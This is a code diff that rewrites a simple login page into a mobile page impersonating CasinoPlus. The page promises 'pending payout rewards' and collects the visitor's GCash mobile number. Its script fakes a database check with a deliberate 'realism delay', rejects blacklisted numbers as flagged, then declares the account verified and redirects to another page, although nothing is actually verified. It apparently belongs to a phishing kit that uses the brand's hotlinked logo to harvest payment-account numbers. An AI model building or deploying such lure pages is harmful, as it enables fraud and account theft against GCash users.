@@ -2,30 +2,228 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
-    <link rel="stylesheet" href="styles.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CasinoPlus | Account Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%);
+            --dark-bg: #04070d;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Public Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            background-color: var(--dark-bg);
+            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 50%),
+                              url('https://www.transparenttextures.com/patterns/dark-matter.png');
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-card {
+            background: rgba(255, 255, 255, 0.03);
+            width: 100%;
+            max-width: 380px;
+            padding: 40px 25px;
+            border-radius: 30px;
+            border: 1px solid rgba(212, 175, 55, 0.3);
+            backdrop-filter: blur(15px);
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            position: relative;
+        }
+
+        .logo {
+            width: 170px;
+            margin-bottom: 30px;
+            filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.4));
+        }
+
+        h2 { font-weight: 800; font-size: 24px; margin-bottom: 10px; color: #fff; letter-spacing: 0.5px; }
+        p { color: #9ca3af; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            color: #fbbf24;
+            text-transform: uppercase;
+            font-weight: 800;
+            margin-bottom: 8px;
+            margin-left: 5px;
+            letter-spacing: 1.5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 18px;
+            border-radius: 15px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(0,0,0,0.5);
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            outline: none;
+            transition: all 0.3s ease;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        input:focus { 
+            border-color: #d4af37; 
+            box-shadow: 0 0 20px rgba(212,175,55,0.15);
+            background: rgba(0,0,0,0.7);
+        }
+
+        .btn-verify {
+            background: var(--gold);
+            color: #000;
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: 800;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 8px 0 #8b6508;
+        }
+
+        .btn-verify:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #8b6508;
+        }
+
+        .btn-verify:disabled { 
+            background: #4b5563; 
+            opacity: 0.8; 
+            cursor: not-allowed; 
+            box-shadow: 0 4px 0 #1f2937;
+            transform: translateY(4px);
+            color: #9ca3af;
+        }
+
+        /* Status Messages */
+        #status-msg {
+            display: none;
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 700;
+            line-height: 1.4;
+        }
+        .error { background: rgba(239, 68, 68, 0.15); color: #ff4d4d; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .success { background: rgba(57, 255, 20, 0.1); color: #39ff14; border: 1px solid rgba(57, 255, 20, 0.3); }
+
+        /* Spinner Animation */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0,0,0,0.1);
+            border-top: 3px solid #000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <div class="login-card">
-        <h2>Login</h2>
-        <input type="text" id="username" placeholder="Username">
-        <input type="password" id="password" placeholder="Password">
-        <button onclick="handleAuth()">Login</button>
-        <div class="spinner" style="display:none;"></div>
-        <div class="status-message"></div>
+
+<div class="login-card">
+    <img src="https://casinoplus.static2.website/images/logo1.png" alt="CasinoPlus" class="logo">
+    
+    <h2>Membership Check</h2>
+    <p>Please verify your GCash number to access your pending payout rewards.</p>
+
+    <div class="input-group">
+        <label>GCash Mobile Number</label>
+        <input type="tel" id="phoneInput" placeholder="0917XXXXXXX" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
     </div>
+
+    <button class="btn-verify" id="verifyBtn" onclick="handleAuth()">
+        Verify Account
+    </button>
+
+    <div id="status-msg"></div>
+</div>
+
+<script src="config.js"></script>
+
 <script>
-function handleAuth() {
-    document.querySelector('.spinner').style.display = 'block';
-    document.querySelector('.status-message').innerText = ''; 
-    // Simulate authentication process
-    setTimeout(() => {
-        // After auth process
-        document.querySelector('.spinner').style.display = 'none';
-        document.querySelector('.status-message').innerText = 'Logged in successfully!';
-    }, 2000);
-}
+    function handleAuth() {
+        const input = document.getElementById('phoneInput');
+        const btn = document.getElementById('verifyBtn');
+        const status = document.getElementById('status-msg');
+        const phone = input.value.trim();
+
+        // 1. Basic Validation
+        if (phone.length < 11 || !phone.startsWith('09')) {
+            showStatus("⚠️ Invalid Number: Please enter a valid 11-digit GCash number starting with 09.", "error");
+            return;
+        }
+
+        // 2. Start Loading State
+        btn.disabled = true;
+        btn.innerHTML = `<div class="spinner"></div> CHECKING DATABASE...`;
+        status.style.display = "none";
+
+        // Realism delay (2.5 seconds)
+        setTimeout(() => {
+            
+            // 3. BLACKLIST CHECK (Mula sa config.js)
+            if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
+                showStatus("❌ ACCESS DENIED: This account has been flagged for multiple reward claims or suspicious activity.", "error");
+                resetButton();
+                return;
+            }
+
+            // 4. SUCCESS FLOW
+            btn.innerHTML = "VERIFIED! REDIRECTING...";
+            btn.style.background = "#39ff14"; 
+            btn.style.boxShadow = "0 8px 0 #1b630b";
+            showStatus("✅ Membership Confirmed! Syncing your rewards data...", "success");
+
+            setTimeout(() => {
+                window.location.href = "main.html";
+            }, 1800);
+
+        }, 2500);
+    }
+
+    function showStatus(msg, type) {
+        const status = document.getElementById('status-msg');
+        status.innerHTML = msg;
+        status.className = type;
+        status.style.display = "block";
+    }
+
+    function resetButton() {
+        const btn = document.getElementById('verifyBtn');
+        btn.disabled = false;
+        btn.innerHTML = "Verify Account";
+        btn.style.background = "var(--gold)";
+        btn.style.boxShadow = "0 8px 0 #8b6508";
+    }
+
+    // Auto-focus input
+    window.onload = () => document.getElementById('phoneInput').focus();
 </script>
+
 </body>
 </html>
